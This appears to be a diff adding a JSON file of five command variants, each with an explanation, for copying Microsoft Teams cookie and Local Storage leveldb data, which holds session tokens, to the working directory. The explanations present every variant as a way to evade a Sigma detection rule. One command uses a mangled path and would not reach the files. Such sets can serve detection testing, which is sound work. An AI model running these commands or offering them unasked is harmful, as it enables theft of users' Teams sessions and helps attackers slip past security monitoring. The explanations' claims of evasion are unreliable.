@@ -1,0 +1,22 @@
+[
+  {
+    "output": "cmd /c copy \"%LOCALAPPDATA%\\Microsoft\\Teams\\Cookies\" .",
+    "explanation": "This command attempts to copy the Teams Cookies directory using environment variables and quotes to bypass detection. It omits unnecessary arguments and uses standard command-line syntax."
+  },
+  {
+    "output": "powershell.exe -Command \"Copy-Item -Path '$env:LOCALAPPDATA\\Microsoft\\Teams\\Local Storage\\leveldb' -Destination '.'\"",
+    "explanation": "This PowerShell command uses environment variables and double quotes to reference the leveldb directory. It is a valid alternative syntax that may evade detection by using different formatting."
+  },
+  {
+    "output": "robocopy \"%LOCALAPPDATA%\\Microsoft\\Teams\\Local Storage\\leveldb\" \".\" /E",
+    "explanation": "This command uses the robocopy utility with environment variables and quotes to bypass detection. It is a valid command-line alternative that may not be flagged by the Sigma rule."
+  },
+  {
+    "output": "cmd /c move \"/Microsoft/Teams/Local Storage/leveldb\" \".\"",
+    "explanation": "This command uses forward slashes and quotes to bypass detection. It is a valid command-line alternative that may not be flagged by the Sigma rule."
+  },
+  {
+    "output": "powershell.exe -Command \"Copy-Item -Path '$env:LOCALAPPDATA\\\\Microsoft\\\\Teams\\\\Cookies' -Destination '.'\"",
+    "explanation": "This PowerShell command uses environment variables and escaped backslashes to reference the Cookies directory. It is a valid alternative syntax that may evade detection by using different formatting."
+  }
+]
